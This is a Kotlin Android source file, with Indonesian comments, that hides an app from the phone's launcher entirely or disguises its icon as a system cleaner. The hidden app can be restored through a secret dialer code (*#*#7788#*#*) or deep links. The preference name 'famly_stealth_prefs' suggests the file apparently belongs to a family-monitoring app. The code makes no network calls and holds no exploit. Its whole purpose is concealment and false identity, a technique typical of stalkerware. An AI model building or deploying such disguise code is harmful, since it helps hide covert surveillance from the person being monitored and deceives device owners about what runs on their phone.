package com.example.data.security

import android.content.ComponentName
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.util.Log

object IconDisguiseManager {

    private const val TAG = "IconDisguiseManager"
    private const val PREFS_NAME = "famly_stealth_prefs"
    private const val KEY_APP_HIDDEN = "key_app_hidden"

    private const val MAIN_ACTIVITY = "com.example.MainActivity"
    private const val CLEANER_ALIAS = "com.example.CleanerAlias"

    private fun getPrefs(context: Context): SharedPreferences {
        return context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    }

    fun isAppHidden(context: Context): Boolean {
        return getPrefs(context).getBoolean(KEY_APP_HIDDEN, false)
    }

    /**
     * Sembunyikan ikon aplikasi dari Launcher/Home Screen secara total (Background-Only/Stealth Mode).
     * Aplikasi tetap bisa dibuka kembali melalui Dial Pad (*#*#7788#*#*) atau Deep Link (famly://open atau cleaner://open).
     */
    fun setAppHidden(context: Context, hidden: Boolean) {
        try {
            val pm = context.packageManager
            val defaultComponent = ComponentName(context, MAIN_ACTIVITY)
            val aliasComponent = ComponentName(context, CLEANER_ALIAS)

            getPrefs(context).edit().putBoolean(KEY_APP_HIDDEN, hidden).apply()

            if (hidden) {
                // Disable launcher component so no icon appears in Home / Menu
                pm.setComponentEnabledSetting(
                    defaultComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                pm.setComponentEnabledSetting(
                    aliasComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.d(TAG, "👻 Mode Sembunyi Aktif: Ikon aplikasi disembunyikan dari Launcher.")
            } else {
                // Restore launcher icon
                pm.setComponentEnabledSetting(
                    defaultComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                pm.setComponentEnabledSetting(
                    aliasComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.d(TAG, "📱 Ikon aplikasi dimunculkan kembali di Launcher.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Gagal mengubah status sembunyi aplikasi: ${e.message}", e)
        }
    }

    /**
     * Pulihkan visibilitas launcher saat dibuka lewat kode rahasia atau deep link
     */
    fun restoreLauncher(context: Context) {
        try {
            val pm = context.packageManager
            val defaultComponent = ComponentName(context, MAIN_ACTIVITY)
            pm.setComponentEnabledSetting(
                defaultComponent,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            getPrefs(context).edit().putBoolean(KEY_APP_HIDDEN, false).apply()
            Log.d(TAG, "🔓 Launcher dipulihkan via trigger rahasia.")
        } catch (e: Exception) {
            Log.e(TAG, "Gagal memulihkan launcher: ${e.message}", e)
        }
    }

    fun setCleanerDisguise(context: Context, enabled: Boolean) {
        try {
            val pm = context.packageManager
            val defaultComponent = ComponentName(context, MAIN_ACTIVITY)
            val aliasComponent = ComponentName(context, CLEANER_ALIAS)

            if (enabled) {
                pm.setComponentEnabledSetting(
                    aliasComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                pm.setComponentEnabledSetting(
                    defaultComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.d(TAG, "Ikon Penyamaran Pembersih Sistem Diaktifkan.")
            } else {
                pm.setComponentEnabledSetting(
                    defaultComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                pm.setComponentEnabledSetting(
                    aliasComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.d(TAG, "Ikon Asli Dipulihkan.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Gagal mengubah ikon penyamaran launcher: ${e.message}", e)
        }
    }
}
